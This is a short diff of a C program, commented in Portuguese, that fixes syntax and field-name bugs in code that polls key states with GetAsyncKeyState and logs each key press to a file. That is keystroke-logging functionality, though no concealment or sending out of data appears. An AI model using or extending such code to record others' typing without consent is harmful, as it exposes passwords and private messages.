@@ -9,7 +9,7 @@ typedef struct {
 } EstadoTecla;
 
 EstadoTecla teclas[MAX_TECLAS]; // vetor para armazenar todas as teclas monitoradas
-int total_teclas = 0 // variavel usada na função AdicionarTecla
+int total_teclas = 0; // variavel usada na função AdicionarTecla
 
 
 // essa função torna humanamente legível o código vk das teclas
@@ -35,7 +35,7 @@ void VKParaString(int vk, char *buffer) {
         case VK_F9:  case VK_F10: case VK_F11: case VK_F12:
             sprintf(buffer, "F%d", vk - VK_F1 + 1);
             break;
-        default
+        default:
             // numeros e letras
             if (vk >= '0' && vk <= '9') {
                 buffer[0] = (char)vk; buffer[1] = '\0';
@@ -90,7 +90,7 @@ void VerificarTeclas(FILE *arquivo) {
         int vk = teclas[i].vk;
         int esta_pressionada = (GetAsyncKeyState(vk) & 0x8000) ? 1 : 0;
 
-        if (esta_pressionada && !teclas[i].esta_pressionada) {
+        if (esta_pressionada && !teclas[i].estava_pressionada) {
             VKParaString(vk, nome_tecla);
             fprintf(arquivo, "%s\n", nome_tecla);
             fflush(arquivo);
